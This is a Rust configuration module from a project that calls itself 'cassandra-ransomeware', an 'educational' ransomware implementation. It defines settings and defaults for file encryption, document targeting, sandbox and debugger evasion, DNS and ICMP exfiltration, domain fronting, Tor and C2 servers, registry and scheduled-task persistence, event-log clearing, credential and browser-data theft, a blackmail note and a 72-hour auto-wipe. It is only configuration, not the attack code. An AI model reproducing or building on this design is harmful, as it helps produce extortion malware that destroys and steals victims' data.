use serde::{Deserialize, Serialize};
use std::fs;
use std::path::Path;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeneralConfig {
    pub name: String,
    pub version: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptionConfig {
    pub algorithm: String,
    pub chunk_size: usize,
    pub parallel_workers: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AiTargetingConfig {
    pub enabled: bool,
    pub max_files_to_analyze: usize,
    pub prioritize_large_files: bool,
    pub prioritize_recent_files: bool,
    pub prioritize_documents: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StealthConfig {
    pub anti_analysis_checks: bool,
    pub vm_detection: bool,
    pub debugger_detection: bool,
    pub delay_between_operations: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommunicationConfig {
    pub dns_tunneling_enabled: bool,
    pub icmp_exfil_enabled: bool,
    pub domain_fronting_enabled: bool,
    pub social_steganography_enabled: bool,
    pub tor_proxy_enabled: bool,
    pub tor_proxy_address: String,
    pub primary_c2: String,
    pub backup_c2: String,
    pub cdn_front: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceConfig {
    pub registry_keys: bool,
    pub startup_folder: bool,
    pub scheduled_tasks: bool,
    pub service_creation: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AntiForensicConfig {
    pub secure_deletion_passes: u32,
    pub wipe_free_space: bool,
    pub clear_event_logs: bool,
    pub capture_screenshot: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DataTheftConfig {
    pub enabled: bool,
    pub collect_system_info: bool,
    pub collect_user_files: bool,
    pub collect_browser_data: bool,
    pub collect_credentials: bool,
    pub capture_screenshots: bool,
    pub max_files_to_collect: usize,
    pub max_file_preview_size: usize,
    pub exfiltrate_to_c2: bool,
    pub generate_blackmail_note: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WiperConfig {
    pub deadline_hours: u32,
    pub auto_wipe_on_deadline: bool,
    pub wipe_network_shares: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebInterfaceConfig {
    pub enabled: bool,
    pub port: u16,
    pub host: String,
    pub auto_open_browser: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LoggingConfig {
    pub console_logging: bool,
    pub file_logging: bool,
    pub log_level: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DemoConfig {
    pub safe_mode: bool,
    pub show_all_features: bool,
    pub simulate_encryption: bool,
    pub simulate_exfiltration: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DevelopmentConfig {
    pub test_mode: bool,
    pub integration_test: bool,
    pub verbose_output: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    pub general: GeneralConfig,
    pub encryption: EncryptionConfig,
    pub ai_targeting: AiTargetingConfig,
    pub stealth: StealthConfig,
    pub communication: CommunicationConfig,
    pub persistence: PersistenceConfig,
    pub anti_forensic: AntiForensicConfig,
    pub data_theft: DataTheftConfig,
    pub wiper: WiperConfig,
    pub web_interface: WebInterfaceConfig,
    pub logging: LoggingConfig,
    pub demo: DemoConfig,
    pub development: DevelopmentConfig,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            general: GeneralConfig {
                name: "cassandra-ransomeware".to_string(),
                version: "1.0.0".to_string(),
                description: "Advanced Educational Ransomware Implementation".to_string(),
            },
            encryption: EncryptionConfig {
                algorithm: "ChaCha20Poly1305".to_string(),
                chunk_size: 65536,
                parallel_workers: 4,
            },
            ai_targeting: AiTargetingConfig {
                enabled: true,
                max_files_to_analyze: 10000,
                prioritize_large_files: true,
                prioritize_recent_files: true,
                prioritize_documents: true,
            },
            stealth: StealthConfig {
                anti_analysis_checks: true,
                vm_detection: true,
                debugger_detection: true,
                delay_between_operations: 100,
            },
            communication: CommunicationConfig {
                dns_tunneling_enabled: true,
                icmp_exfil_enabled: true,
                domain_fronting_enabled: true,
                social_steganography_enabled: true,
                tor_proxy_enabled: true,
                tor_proxy_address: "127.0.0.1:9050".to_string(),
                primary_c2: "your-c2-domain.com".to_string(),
                backup_c2: "8.8.8.8".to_string(),
                cdn_front: "cdn.example.com".to_string(),
            },
            persistence: PersistenceConfig {
                registry_keys: true,
                startup_folder: true,
                scheduled_tasks: true,
                service_creation: false,
            },
            anti_forensic: AntiForensicConfig {
                secure_deletion_passes: 3,
                wipe_free_space: true,
                clear_event_logs: true,
                capture_screenshot: true,
            },
            data_theft: DataTheftConfig {
                enabled: true,
                collect_system_info: true,
                collect_user_files: true,
                collect_browser_data: true,
                collect_credentials: true,
                capture_screenshots: true,
                max_files_to_collect: 100,
                max_file_preview_size: 1024,
                exfiltrate_to_c2: false,
                generate_blackmail_note: true,
            },
            wiper: WiperConfig {
                deadline_hours: 72,
                auto_wipe_on_deadline: true,
                wipe_network_shares: false,
            },
            web_interface: WebInterfaceConfig {
                enabled: false,
                port: 8000,
                host: "127.0.0.1".to_string(),
                auto_open_browser: false,
            },
            logging: LoggingConfig {
                console_logging: false,
                file_logging: false,
                log_level: "info".to_string(),
            },
            demo: DemoConfig {
                safe_mode: true,
                show_all_features: true,
                simulate_encryption: true,
                simulate_exfiltration: true,
            },
            development: DevelopmentConfig {
                test_mode: false,
                integration_test: false,
                verbose_output: false,
            },
        }
    }
}

impl Config {
    pub fn load() -> Result<Self, Box<dyn std::error::Error>> {
        let config_path = Path::new("config.toml");

        if config_path.exists() {
            let contents = fs::read_to_string(config_path)?;
            let config: Config = toml::from_str(&contents)?;
            Ok(config)
        } else {
            // Create default config file
            let default_config = Config::default();
            let toml_string = toml::to_string_pretty(&default_config)?;
            fs::write(config_path, toml_string)?;
            println!("Created default config.toml file");
            Ok(default_config)
        }
    }

    pub fn save(&self) -> Result<(), Box<dyn std::error::Error>> {
        let toml_string = toml::to_string_pretty(self)?;
        fs::write("config.toml", toml_string)?;
        Ok(())
    }
}